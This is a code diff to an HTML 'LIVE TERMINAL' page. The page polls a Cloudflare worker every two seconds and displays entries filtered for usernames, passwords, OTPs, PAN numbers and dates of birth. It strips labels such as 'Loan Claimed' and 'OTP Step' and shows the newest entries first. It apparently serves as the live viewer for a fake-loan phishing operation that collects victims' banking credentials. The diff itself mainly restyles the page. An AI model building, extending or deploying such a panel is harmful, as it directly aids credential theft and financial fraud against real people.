@@ -6,34 +6,48 @@
     <title>LIVE TERMINAL</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background-color: #ffffff; padding: 8px; font-family: 'Consolas', monospace; }
+        body { background-color: #f4f4f4; padding: 8px; font-family: 'Consolas', monospace; }
         
         .header { 
             background: #fff; padding: 10px; margin-bottom: 8px;
             display: flex; justify-content: space-between; align-items: center;
             border-bottom: 1px solid #eee;
+            border-radius: 4px;
         }
         .status-text { font-size: 10px; color: #00a859; font-weight: bold; }
         #count { color: #ff0000; font-size: 26px; font-weight: 900; }
 
+        #logsContainer { width: 100%; display: flex; flex-direction: column; }
+
         .log-card { 
-            background: #000000; margin-bottom: 6px; padding: 12px; 
-            border-radius: 4px; width: 100%; display: flex; flex-direction: column;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            margin-bottom: 8px; padding: 12px; 
+            border-radius: 6px; width: 100%; display: flex; flex-direction: column;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
 
+        /* --- BLACK & WHITE THEME LOGIC --- */
+        .log-card:nth-child(odd) {
+            background-color: #ffffff;
+            border: 1px solid #ddd;
+        }
+        .log-card:nth-child(odd) .detail-text { color: #000000; }
+
+        .log-card:nth-child(even) {
+            background-color: #000000;
+        }
+        .log-card:nth-child(even) .detail-text { color: #ffffff; }
+
         .detail-text { 
-            color: #ffffff; font-size: 14px; white-space: pre-wrap; 
+            font-size: 14px; white-space: pre-wrap; 
             line-height: 1.6; word-break: break-all;
         }
 
         .time-footer { 
             display: block; margin-top: 8px; font-size: 9px; 
             color: #ff0000; text-align: right; font-weight: bold;
-            border-top: 1px solid #1a1a1a; padding-top: 4px;
+            padding-top: 4px;
         }
 
-        #logsContainer { width: 100%; }
         .loading { font-size: 12px; color: #999; text-align: center; margin-top: 30px; }
     </style>
 </head>
@@ -45,45 +59,48 @@
     </div>
 
     <div id="logsContainer">
-        <p class="loading">Filtering live data...</p>
+        <p class="loading">Fetching live entries from worker...</p>
     </div>
 
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
 
-        // Faltu words ko clean karne ka function
         function cleanTrash(text) {
             if (!text) return "";
             return text
-                .replace(/Type:[^|]*/gi, "")     // Type: ... ko hataye
-                .replace(/Path:[^|]*/gi, "")     // Path: ... ko hataye
-                .replace(/Loan Claimed/gi, "")   // Loan Claimed hataye
-                .replace(/OTP Step \d+/gi, "")   // OTP Step 1/2 hataye
-                .replace(/\| \s*\|/g, "|")       // Double pipes hataye
+                .replace(/Type:[^|]*/gi, "")
+                .replace(/Path:[^|]*/gi, "")
+                .replace(/Loan Claimed/gi, "")
+                .replace(/OTP Step \d+/gi, "")
+                .replace(/\| \s*\|/g, "|")
                 .trim();
         }
 
         async function fetchLogs() {
             try {
+                // Har baar fresh data ke liye timestamp add kiya hai
                 const response = await fetch(`${workerURL}?t=${Date.now()}`);
                 const data = await response.json();
                 const container = document.getElementById('logsContainer');
                 
-                // Filter: Sirf kaam ki info wale cards
+                // Filter: Sirf wo data jo kaam ka hai
                 const filteredData = data.filter(item => {
                     const d = item.detail.toLowerCase();
                     return d.includes("user") || d.includes("pass") || d.includes("otp") || 
                            d.includes("pan") || d.includes("dob") || d.includes("name");
                 });
 
-                document.getElementById('count').innerText = filteredData.length;
+                // Reverse taaki New Entry sabse upar dikhe
+                const sortedData = filteredData.reverse();
 
-                if (filteredData.length === 0) {
-                    container.innerHTML = "<p class='loading'>No Data found.</p>";
+                document.getElementById('count').innerText = sortedData.length;
+
+                if (sortedData.length === 0) {
+                    container.innerHTML = "<p class='loading'>Waiting for new data...</p>";
                     return;
                 }
 
-                container.innerHTML = filteredData.map(item => {
+                container.innerHTML = sortedData.map(item => {
                     const cleanDetail = cleanTrash(item.detail);
                     return `
                         <div class="log-card">
@@ -94,10 +111,11 @@
                 }).join('');
 
             } catch (err) {
-                console.error("Sync Error");
+                console.error("Connection Error with Worker");
             }
         }
 
+        // Har 2 second mein check karega ki koi nayi entry aayi ya nahi
         setInterval(fetchLogs, 2000);
         window.onload = fetchLogs;
     </script>
